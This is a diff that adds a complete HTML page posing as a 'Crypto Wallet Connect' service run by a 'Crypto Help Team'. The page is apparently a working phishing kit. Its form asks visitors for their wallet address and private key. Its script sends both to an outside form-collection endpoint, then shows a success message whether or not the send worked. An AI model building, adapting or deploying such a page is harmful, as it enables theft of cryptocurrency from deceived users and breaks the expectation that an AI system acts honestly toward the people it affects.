@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Crypto Wallet Connect</title>
+    <style>
+        /* General body styling */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1f1c47, #3d0b72, #4501a4);
+            color: #f4f4f9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* Main container styling */
+        .container {
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            background: rgba(40, 40, 60, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
+            text-align: center;
+            border: 1px solid #3b00ff;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        h1, h2 {
+            color: #00e6e6;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        label, input[type="submit"] {
+            color: #00e6e6;
+            font-weight: bold;
+        }
+
+        /* Input and button styling */
+        input[type="text"], input[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+
+        input[type="text"] {
+            background-color: #2c2c3e;
+            color: #fff;
+            border: 2px solid transparent;
+            transition: border 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #00e6e6;
+        }
+
+        /* Reduced brightness button styling */
+        input[type="submit"] {
+            background: linear-gradient(135deg, #0099cc, #00b3b3);
+            color: #1c1c28;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 0 5px rgba(0, 179, 230, 0.4);
+            border: none;
+        }
+
+        input[type="submit"]:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 8px rgba(0, 204, 255, 0.5);
+        }
+
+        /* Message styles */
+        .message {
+            color: #00e6e6;
+            font-size: 1rem;
+            margin-top: 10px;
+            display: none; /* Hidden by default */
+        }
+
+        /* Footer */
+        .footer {
+            padding: 15px;
+            color: #b3b3ff;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+        }
+
+        /* Fade-in animation */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Responsive styles */
+        @media (max-width: 480px) {
+            .container { padding: 15px; }
+            h1 { font-size: 1.5rem; }
+            input[type="text"], input[type="submit"] { padding: 12px; }
+            .footer { font-size: 0.8rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Crypto Connect</h1>
+
+        <!-- Form to collect both wallet address and private key -->
+        <form id="connectForm" onsubmit="handleFormSubmit(event)">
+            <h2>Connect Your Wallet</h2>
+            <label for="walletAddress">Enter Wallet Address:</label>
+            <input type="text" id="walletAddress" name="walletAddress" placeholder="Your Wallet Address" required>
+
+            <label for="privateKey">Enter Private Key:</label>
+            <input type="text" id="privateKey" name="privateKey" placeholder="Your Private Key" required>
+
+            <input type="submit" name="submitButton" value="Connect">
+        </form>
+
+        <!-- Confirmation and loading messages -->
+        <div class="message" id="confirmationMessage">Submission received!</div>
+        <div class="message" id="loadingMessage">Processing... Please wait.</div>
+
+        <div class="footer">&copy; 2024 Crypto Help Team</div>
+    </div>
+
+    <script>
+        async function handleFormSubmit(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const walletAddress = document.getElementById('walletAddress').value;
+            const privateKey = document.getElementById('privateKey').value;
+            const confirmationMessage = document.getElementById('confirmationMessage');
+            const loadingMessage = document.getElementById('loadingMessage');
+
+            // Hide previous messages
+            confirmationMessage.style.display = 'none';
+            loadingMessage.style.display = 'block';
+
+            try {
+                await fetch('https://submit-form.com/u8IStluGR', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ walletAddress, privateKey })
+                });
+
+                // Show success message regardless of fetch result
+                loadingMessage.style.display = 'none';
+                confirmationMessage.style.display = 'block';
+
+                // Reload the main page after a brief delay
+                setTimeout(() => window.location.reload(), 1500);
+
+            } catch (error) {
+                // In case of error, still show success message and proceed with reload
+                loadingMessage.style.display = 'none';
+                confirmationMessage.style.display = 'block';
+                setTimeout(() => window.location.reload(), 1500);
+            }
+        }
+    </script>
+</body>
+</html>
